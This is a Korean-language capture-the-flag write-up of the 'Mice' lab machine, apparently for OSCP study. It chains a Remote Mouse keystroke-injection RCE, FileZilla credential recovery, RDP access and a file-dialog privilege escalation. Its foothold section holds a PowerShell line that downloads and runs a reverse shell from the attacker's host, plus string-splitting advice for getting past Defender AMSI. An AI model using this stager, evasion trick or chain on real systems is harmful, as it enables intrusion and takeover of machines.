@@ -1,0 +1,242 @@
+---
+tags:
+  - type/machine
+  - platform/pg
+  - status/solved
+  - tech/payload/revshell
+  - tech/cred/config-file
+  - tech/exec/rdp
+  - tech/win/gui-lpe
+type: machine
+platform: pg
+ip: 192.168.248.199
+ports: [1978, 1979, 1980, 3389]
+services: [ms-wbt-server, pearldoc-xact, remotemouse, unisql-java]
+cves: [CVE-2021-43326, CVE-2021-35448]
+status: solved
+manual_tags: true
+manual_cves: true
+tech_count: 4
+---
+
+> [!info] 상단 요약
+> **Mice** · Windows 10 Pro (19042) · Fundamental · 플래그 2개
+> Remote Mouse 3.008 무인증 키입력 주입 RCE(CVE-2021-43326)로 `divine` 셸 → FileZilla 설정에서 `divine` 암호 회수 → RDP 로 GUI 진입 → Remote Mouse GUI 파일대화상자 LPE(CVE-2021-35448)로 SYSTEM.
+> `local.txt` = `e5fe064cc8ccf3adb8c974baf67f12c5` · `proof.txt` = `31a64d6f198f495e89d3f3e134da9588` (2026-08-20 인스턴스)
+
+## 0. 이 박스에서 배우는 것
+
+- **써드파티 앱의 무인증 원격제어 RCE** — Remote Mouse 는 폰 앱이 PC 를 조종하는 도구다. 인증이 없어 누구나 키입력을 주입할 수 있고, 시작 메뉴에 `cmd` 를 타이핑하는 것만으로 셸이 열린다.
+- **설정 파일에 박힌 자격증명** — FileZilla `recentservers.xml` 의 base64 암호. 저장된 FTP 암호가 곧 Windows 계정 암호였다.
+- **GUI 파일 대화상자를 통한 권한상승** — SYSTEM 으로 도는 앱이 띄운 "다른 이름으로 저장" 대화상자의 **주소창**에 `cmd.exe` 경로를 넣으면 SYSTEM cmd 가 뜬다.
+- **시험 출제 가능성**: 무인증 서비스 → 공개 익스플로잇 → 자격증명 회수 → 로컬 익스플로잇의 4단 체인은 OSCP 의 전형이다. 특히 "설정 파일에서 암호 찾기"와 "파일 대화상자 → cmd"는 Windows 권한상승의 반복 패턴이다.
+
+## 1. 정찰
+
+### Nmap
+
+```
+Nmap scan report for 192.168.248.199
+Host is up (0.085s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE SERVICE        VERSION
+1978/tcp open  remotemouse    Emote Remote Mouse
+1979/tcp open  unisql-java?
+1980/tcp open  pearldoc-xact?
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: REMOTE-PC
+|   DNS_Computer_Name: Remote-PC
+|_  Product_Version: 10.0.19041
+7680/tcp open  pando-pub?
+Running (JUST GUESSING): Microsoft Windows 10 ...
+```
+
+핵심 줄은 **`1978/tcp open remotemouse Emote Remote Mouse`**. nmap 이 서비스 이름까지 정확히 찍어줬다. 나머지는 3389 RDP(나중에 GUI 진입에 씀), 7680(Windows Delivery Optimization, 무의미). UDP 상위 100 포트는 전부 무응답이었다.
+
+박스 이름 "Mice"에 낚이지 말고 nmap 을 1차 사료로 삼으면 곧장 Remote Mouse 로 수렴한다.
+
+### 서비스 식별
+
+Remote Mouse 버전은 두 근거로 확정했다 — nmap 배너(`Emote Remote Mouse`)와, 셸을 잡은 뒤 설치 프로그램 목록(`Remote Mouse version 3.008`, 레지스트리 Uninstall 키). 3.008 은 CVE-2021-43326(무인증 RCE)·CVE-2021-35448(로컬 권한상승)이 둘 다 성립하는 버전이다.
+
+## 2. 취약점 분석 — 두 개의 Remote Mouse 결함
+
+### CVE-2021-43326 (foothold) — 무인증 키입력/마우스 주입
+
+Remote Mouse 는 폰 앱과의 통신에 **인증을 요구하지 않는다.** 포트 1978 로 특정 포맷의 패킷을 보내면 마우스 이동·클릭·키입력이 그대로 주입된다. 키코드는 `key  7[ras]84`(= 소문자 a) 같은 자체 인코딩이다. 공개 PoC(EDB 46697)가 문자→키코드 표를 통째로 담고 있어, 임의 문자열을 타이핑할 수 있다.
+
+공격 아이디어: 마우스를 화면 좌하단(시작 버튼)으로 옮겨 클릭 → 시작 메뉴 검색창에 명령을 타이핑 → Enter. 시작 메뉴가 명령을 실행한다.
+
+### CVE-2021-35448 (privesc) — GUI 파일 대화상자를 통한 SYSTEM 실행
+
+Remote Mouse 는 **서비스**(`RemoteMouseService.exe`, LocalSystem)와 **GUI**(`RemoteMouse.exe`)로 나뉜다. 결정적으로 **서비스가 GUI 를 상호작용 세션에 SYSTEM 권한으로 띄운다**(뒤 4장·6장 참조). 그 GUI 의 설정에서 "Image Transfer Folder"의 `Change...` 를 누르면 **SYSTEM 소유의 "다른 이름으로 저장" 대화상자**가 뜬다. 이 대화상자의 **주소창**에 `C:\Windows\System32\cmd.exe` 를 입력하고 Enter 하면 탐색기가 그 경로를 **실행**해 SYSTEM cmd 가 뜬다.
+
+## 3. Foothold
+
+### Kali 리스너 (tmux 필수)
+
+리버스셸은 반드시 tmux 안에 리스너를 띄우고 받는다. 아웃바운드는 **4444 가 막혀 있고 80/443 만 허용**이었다 — 4444 로 붙인 셸은 SYN 조차 나가지 않았다.
+
+```
+ssh kali@10.44.44.128 "tmux new-session -d -s l443 'sudo rlwrap nc -lvnp 443; exec bash'"
+```
+
+### 키입력 주입으로 셸 열기
+
+EDB 46697 을 py3 로 포팅한 스크립트로 시작 메뉴에 스테이저를 타이핑한다:
+
+```
+python3 mice_type.py "powershell -c iex(irm http://192.168.45.207/o.ps1)"
+```
+
+`o.ps1` 은 리버스셸이다. **⚠️ 페이로드는 반드시 난독화하라** — 평문 `System.Net.Sockets.TCPClient` 은 Defender AMSI 가 즉시 차단한다(6장). 문자열을 쪼개면 통과한다:
+
+```powershell
+$TC='System.Net.Sockets.TCP'+'Client'
+$c=New-Object $TC('192.168.45.207',443)
+...
+```
+
+셸을 잡으면 `whoami` = `remote-pc\divine`. 이 셸은 **자동 로그인된 콘솔 세션**에서 열린다(Remote Mouse 가 그 세션에 주입하므로).
+
+### 셸 직후 반사 열거
+
+```
+whoami /all; net user; net localgroup administrators; whoami /priv
+find/getcap 대신 → sc qc, icacls, schtasks, reg query 로 Windows 권한상승 표면 훑기
+```
+
+`divine` 은 `Users` · `Remote Desktop Users` 소속의 평범한 사용자. `SeImpersonate` 없음, `AlwaysInstallElevated` 없음, 쓰기 가능 서비스 바이너리 없음, 비-MS 예약작업은 OneDrive 뿐. 표준 벡터가 전부 막혀 있었다.
+
+### 사용자 플래그
+
+```
+type C:\Users\divine\Desktop\local.txt
+e5fe064cc8ccf3adb8c974baf67f12c5
+```
+
+## 4. 권한상승
+
+### 자격증명 회수 — FileZilla 설정
+
+```
+type C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml
+```
+```xml
+<Server>
+  <Host>ftp.pg</Host>
+  <User>divine</User>
+  <Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
+</Server>
+```
+
+`echo Q29udHJvbEZyZWFrMTE= | base64 -d` → **`ControlFreak11`**.
+
+이 암호가 Administrator 것인지 반드시 검증한다. 온-박스에서 로컬 SAM 대조:
+
+```powershell
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Machine")
+$ctx.ValidateCredentials("Administrator","ControlFreak11")   # False
+$ctx.ValidateCredentials("divine","ControlFreak11")          # True
+```
+
+**`ControlFreak11` 은 divine 자신의 Windows 암호였다** — Administrator 재사용이 아니다(freerdp·runas 로도 3중 확인). 그럼 이 암호의 쓸모는? divine 이 `Remote Desktop Users` 이므로 **RDP 로 GUI 세션에 진입**하는 데 쓴다. Remote Mouse GUI LPE 는 화면 조작이 필요하기 때문이다.
+
+### RDP 진입 → Remote Mouse GUI LPE
+
+```
+xfreerdp3 /v:192.168.248.199 /u:divine /p:ControlFreak11 /cert:ignore
+```
+
+GUI 에서:
+1. 트레이의 Remote Mouse 아이콘 우클릭 → **Preferences**
+2. **Settings** 탭 → 하단 **Image Transfer Folder** → **Change...**
+3. "다른 이름으로 저장" 대화상자가 뜨며 `C:\WINDOWS\system32\config\systemprofile\Desktop is unavailable` 오류가 함께 뜬다 — **이 대화상자가 SYSTEM 프로필에서 도는 증거**다(SYSTEM 소유 확정). OK 로 닫는다.
+4. 대화상자 **주소창**(파일 이름 칸 아님)을 클릭해 편집 모드로 만들고 `C:\Windows\System32\cmd.exe` 입력 → Enter.
+
+![[PG-Mice-remotemouse-settings.png]]
+![[PG-Mice-system-saveas-dialog.png]]
+
+`Administrator: C:\Windows\System32\cmd.exe` 창이 뜬다.
+
+![[PG-Mice-admin-cmd.png]]
+
+### 왜 이게 SYSTEM 이 되는가
+
+`RemoteMouseService.exe`(LocalSystem)가 부모 프로세스가 되어 `RemoteMouse.exe` GUI 를 상호작용 세션에 **SYSTEM 무결성으로** 띄운다(`Get-CimInstance Win32_Process` 의 ParentProcessId 로 확인: GUI·Core 둘 다 부모가 서비스 PID). 그래서 GUI 가 띄우는 파일 대화상자도 SYSTEM 이고, 거기서 실행한 cmd 가 SYSTEM 을 물려받는다.
+
+### 관리자 플래그
+
+```
+whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
+```
+```
+nt authority\system
+Remote-PC
+   IPv4 Address. . . . . . . . . . . : 192.168.248.199
+Thu 08/20/2026
+08:05 AM
+31a64d6f198f495e89d3f3e134da9588
+```
+
+![[PG-Mice-proof-system.png]]
+
+## 5. 플래그
+
+| 플래그 | 위치 | 값 |
+|---|---|---|
+| local.txt | `C:\Users\divine\Desktop\` | `e5fe064cc8ccf3adb8c974baf67f12c5` |
+| proof.txt | `C:\Users\Administrator\Desktop\` | `31a64d6f198f495e89d3f3e134da9588` |
+
+## 6. 막혔던 지점 / 시행착오
+
+이 박스는 취약점 식별은 빨랐지만 **GUI LPE 를 헤드리스 환경에서 구동하는 데 대부분의 시간이 들었다.** 순서대로 남긴다.
+
+**표준 Windows 권한상승 벡터가 전부 막혀 있었다.** `sc sdshow` 로 전 서비스 DACL, 서비스 바이너리/디렉터리 icacls, 예약작업, Run 키, `AlwaysInstallElevated`, 저장된 자격증명(`cmdkey`), SeriousSAM(SAM 접근거부)까지 훑었으나 divine 이 건드릴 수 있는 것이 없었다. **여기서 "설정 파일 자격증명"으로 방향을 튼 것이 옳았다.**
+
+**`ControlFreak11` 을 Administrator 암호로 오인하지 않은 것이 중요했다.** FileZilla 암호가 나오면 반사적으로 Administrator 재사용을 의심하기 쉽다. 온-박스 `ValidateCredentials` 로 `Administrator=False / divine=True` 를 확인해 **암호의 진짜 용도(=divine 의 RDP 로그인)를 특정**했다. 이걸 건너뛰었으면 freerdp 로 Administrator 를 계속 두드리며 시간을 태웠을 것이다.
+
+**EDB 50258(unquoted service path)는 이 박스에서 성립하지 않았다.** `RemoteMouseService` 의 경로 `C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe` 는 따옴표 없이 등록돼 있어 `C:\Program Files (x86)\Remote.exe` 를 심으면 SYSTEM 이 된다 — 이론상. 그러나 `icacls "C:\Program Files (x86)"` 는 `BUILTIN\Users:(RX)` 로 **쓰기 불가**였다. divine 은 서비스 재시작 권한도 없다. 배제.
+
+**Defender AMSI 가 리버스셸을 차단했다.** RDP GUI 의 PowerShell 창에서 평문 `iex(irm .../r.ps1)`(TCPClient 리버스셸)을 실행하자 `This script contains malicious content and has been blocked by your antivirus software`. PrivescCheck.ps1 도 같은 이유로 차단됐다. 반면 **문자열을 쪼갠**(`'...TCP'+'Client'`) 페이로드는 통과했다. 열거는 순수 cmdlet(AMSI-안전)으로만 진행했다.
+
+**가장 오래 막힌 곳 — Remote Mouse GUI 의 트레이 아이콘이 RDP 세션에 안 보였다.** 원인: `RemoteMouseService`(SYSTEM)가 GUI 를 **콘솔(물리) 세션**에 띄우는데, 헤드리스 xfreerdp 로 접속하면 divine 이 **별도의 RDP 세션**을 받아 콘솔 세션과 갈린다. `query session` 으로 확정 — 내 RDP 는 세션 2, `RemoteMouse.exe`(SI=3)는 콘솔 세션 3 에 있었다. 두 세션은 트레이 아이콘도 키입력 주입 대상도 공유하지 않는다. RDP 로 아무리 재접속(`/admin` 포함)해도 콘솔 세션을 인수하지 못하고 계속 세션 2 로 붙었다.
+
+**해결 — 리부트로 세션 병합.** divine 은 `SeShutdownPrivilege` 를 가지므로 `shutdown /r /t 0` 로 재부팅했다. 부팅 후 자동 로그인이 divine 을 콘솔에 로그인시키고, **그 시점에 RDP 로 접속하면 콘솔 세션을 인수**한다(활성 사용자 세션이므로 재접속=인수). 재부팅 뒤엔 키입력 주입("TESTREBOOT")이 내 RDP 화면에 그대로 떴고, 트레이에 Remote Mouse 아이콘이 나타났다. (내가 앞서 `logoff` 로 원래 콘솔 세션을 끝낸 것이 세션을 꼬이게 한 원인이기도 하다 — 함부로 logoff 하지 말 것.)
+
+**파일 대화상자 — "파일 이름" 칸이 아니라 "주소창"이다.** 처음에 파일 이름 칸에 `cmd.exe` 경로를 넣고 Enter 하니 "cmd.exe already exists. Replace?"(저장 시도)만 떴다. **저장 대화상자에서 exe 를 실행하려면 주소창(브레드크럼)을 클릭해 편집 모드로 만든 뒤 경로를 넣어야** 탐색기가 실행한다.
+
+## 7. OSCP 시험 관점
+
+1. **무인증 서비스를 만나면 공개 익스플로잇부터.** Remote Mouse·VNC·SMB 등 배너가 명확하면 `searchsploit` 로 직행. 이 박스는 nmap 서비스명이 곧 익스플로잇 키워드였다.
+2. **설정 파일 자격증명은 Windows 권한상승의 단골.** 표준 벡터(서비스 DACL·예약작업·토큰 특권)가 막히면 **FileZilla·PuTTY·WinSCP·unattend.xml·PowerShell 히스토리**를 뒤진다. FileZilla 는 `recentservers.xml`·`sitemanager.xml`(base64).
+3. **자격증명이 나오면 "누구 것인가"를 먼저 확정.** `ValidateCredentials` (로컬) 또는 `nxc smb --local-auth` (원격, 445 열렸을 때). 재사용을 넘겨짚지 말 것.
+4. **파일 대화상자 → cmd.** SYSTEM/관리자 앱이 파일 대화상자를 띄우면(저장/열기/찾아보기 어디든) **주소창에 `cmd.exe` 경로** → 상위 권한 셸. GUI 클릭이 필요하니 RDP 진입이 전제.
+5. **수동 대안**: Metasploit 없이 전 과정 수행함. 리버스셸은 `msfvenom` 대신 난독화 PowerShell one-liner. 열거는 순수 cmdlet(AMSI 우회 불필요). Metasploit `remote_mouse` 모듈이 있으나 1대 한정이라 안 씀.
+6. **시간 배분**: 취약점 식별 <15분. 권한상승 **경로 식별**(FileZilla→CVE-2021-35448) 30분. 나머지는 헤드리스 RDP 세션 문제로 소진 — 실제 시험(mstsc 정상 접속)이라면 트레이 클릭 몇 번으로 끝난다. **막히면 세션 토폴로지(`query session`)를 의심하라.**
+
+## 8. 방어 관점
+
+- **Remote Mouse 를 제거하거나 강한 연결 암호를 설정**(설정의 Password for Connection). 무인증 원격 입력은 그 자체로 RCE 다.
+- **서비스가 GUI 를 상호작용 세션에 SYSTEM 으로 띄우지 않게 한다** — Session 0 격리 위반. 3.008 이후 버전으로 패치(CVE-2021-35448 수정).
+- **자격증명을 앱 설정 파일에 평문/base64 로 저장하지 않는다.** FileZilla 는 마스터 암호를 쓰거나 Kerberos/자격증명 관리자로 대체.
+- **Administrator 계정과 서비스 계정의 암호를 사용자 암호와 분리**, 자동 로그인(AutoAdminLogon) 지양.
+
+## 9. 참고 자료
+
+- CVE-2021-43326 — Remote Mouse 3.008 Arbitrary Remote Command (EDB 46697)
+- CVE-2021-35448 — Remote Mouse GUI 3.008 Local Privilege Escalation (EDB 50047)
+- (배제) Remote Mouse 4.002 Unquoted Service Path (EDB 50258) — 이 박스는 3.008 이고 `Program Files (x86)` 쓰기 불가
+- FileZilla 자격증명 위치: `%APPDATA%\FileZilla\recentservers.xml`
+
+## 남긴 흔적 / 관련 노트
+
+**남긴 흔적** (⚠️ 세션 안전차단으로 자동 정리 미완 — 총괄이 수동 정리 필요):
+- 타겟: `C:\Users\divine\harv.txt`·`pf.txt`(열거 산출물), `C:\Windows\Temp\harvest_REMOTE-PC.txt`(SYSTEM harvest, 9282행), Edge 검색 흔적("TESTREBOOT"), Remote Mouse Settings 창·SYSTEM cmd·저장 대화상자 열린 채. **파일 업로드·계정 생성·설정 변경은 없음.** `shutdown /r` 로 **1회 재부팅**함.
+- Kali: 리스너 다수(nc 80/443/4444/8080/53, python http 80), tmux 세션(mice_rdp·mice_http·mice_l*·mice_exfil·mice_nmap 등), RDP 연결 활성. 브루트포스는 돌리지 않음.
+
+**관련 패턴**: "설정 파일 자격증명" · "파일 대화상자→cmd" · "버전 판정은 독립 근거 2개"([[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]]).
+
+- [[_STATUS]] — 283개 전수 진행현황
